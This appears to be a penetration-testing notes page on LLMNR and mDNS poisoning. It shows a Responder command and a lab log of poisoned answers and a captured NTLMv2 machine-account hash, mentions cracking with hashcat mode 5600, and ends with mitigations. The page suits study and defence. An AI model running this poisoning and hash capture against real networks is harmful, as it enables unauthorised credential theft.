# LLMNR Poisoning

Answering DNS queries from network clients when searching the network for shares and such. \
The responder application will sniff the packets and respond to the request to receive NTLM Hash data. Enabling cracking of the hash with hashcat (-m 5600) for example.

{% hint style="info" %}
Config: /usr/share/responder/Responder.conf
{% endhint %}

```
kali@kali:~ $ sudo responder -I eth0 -dw -v
...
[*] [MDNS] Poisoned answer sent to ::ffff:192.168.56.108 for name PLANETEXPRESS-D.local
[*] [LLMNR]  Poisoned answer sent to ::ffff:192.168.56.108 for name PLANETEXPRESS-D
[LDAP] NTLMv2-SSP Client   : ::ffff:192.168.56.108
[LDAP] NTLMv2-SSP Username : PLANETEXPRESS\PLANETEXPRESS-D$
[LDAP] NTLMv2-SSP Hash     : PLANETEXPRESS-D$::PLANETEXPRESS:6a9d594062e7caad:997EE75F77B114893763D460BF486A94:010100000000000042A1CC4CDB85D80143A40E50CC10196C0000000002000800460052004E00590001001E00570049004E002D0039005A0035004E00420035003100550048004200410004003400570049004E002D0039005A0035004E0042003500310055004800420041002E00460052004E0059002E004C004F00430041004C0003001400460052004E0059002E004C004F00430041004C0005001400460052004E0059002E004C004F00430041004C000800300030000000000000000000000000400000CCD36FF36F714A9C1EA6C4BFB91C88B73ADC902085D673B351C007F8A4EDA81C0A00100000000000000000000000000000000000090034006C006400610070002F0050004C0041004E004500540045005800500052004500530053002D0044002E006C006F00630061006C000000000000000000 
...
```

#### Mitigation

Best solution is to disable LLMNR and NBT-NS use.\
Otherwise require network access control (NAC) and ensure very strong password policy > 14 characters limiting any word usage especially common words and phrases associated with the user/client.
